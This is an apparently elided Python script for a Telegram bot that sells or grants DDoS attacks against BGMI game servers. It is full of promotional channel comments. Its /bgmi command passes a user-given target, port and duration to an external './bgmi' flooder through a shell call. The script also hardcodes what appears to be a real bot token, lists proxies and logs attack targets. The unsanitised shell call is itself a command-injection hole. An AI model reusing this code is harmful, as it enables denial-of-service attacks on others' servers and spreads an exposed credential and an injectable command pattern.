...
# Join :- @MRAAMANKING53 #bgmiddoserpython
...
# Join :- @MRAAMANKING53 #from keep_alive import keep_alive
# Join :- @MRAAMANKING53 #keep_alive()
# Join :- @MRAAMANKING53 # insert your Telegram bot token here
bot = telebot.TeleBot('7025203629:AAFvGbykxOe278GXPr-zFAfKZDhEYDxppd0')

# Join :- @MRAAMANKING53 # Admin user IDs
admin_id = ["1925714820"]

# Join :- @MRAAMANKING53 # File to store allowed user IDs
USER_FILE = "users.txt"

# Join :- @MRAAMANKING53 # File to store command logs
LOG_FILE = "log.txt"


# Join :- @MRAAMANKING53 # List of proxy addresses
PROXIES = [
...
"https://134.73.65.97:6649"
    # Join :- @MRAAMANKING53 # Add more proxy addresses as needed
]
...
# Join :- @MRAAMANKING53 # Function to read free user IDs and their credits from the file
def read_free_users():
    try:
...
# Join :- @MRAAMANKING53 # Function to log command to the file
...
# Join :- @MRAAMANKING53 # Function to clear logs
def clear_logs():
    try:
...
# Join :- @MRAAMANKING53 # Function to record command logs
...
# Join :- @MRAAMANKING53 # Function to handle the reply when free users run the /bgmi command
...
# Join :- @MRAAMANKING53 # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Join :- @MRAAMANKING53 # Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Join :- @MRAAMANKING53 # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Join :- @MRAAMANKING53 # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                ...
                bot.reply_to(message, response)
                return
            # Join :- @MRAAMANKING53 # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Join :- @MRAAMANKING53 # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Join :- @MRAAMANKING53 # Convert time to integer
            time = int(command[3])  # Join :- @MRAAMANKING53 # Convert port to integer
            if time > 240:
                response = "Error: Time interval must be less than 240."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Join :- @MRAAMANKING53 # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 300"
                subprocess.run(full_command, shell=True)
                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /bgmi <target> <port> <time>"  # Join :- @MRAAMANKING53 # Updated command syntax
    else:
...
# Join :- @MRAAMANKING53 # Add /mylogs command to display logs recorded for bgmi and website commands
...
# Join :- @MRAAMANKING53 # Import the 'time' module for sleep functionality
import time
...
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # Join :- @MRAAMANKING53 # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
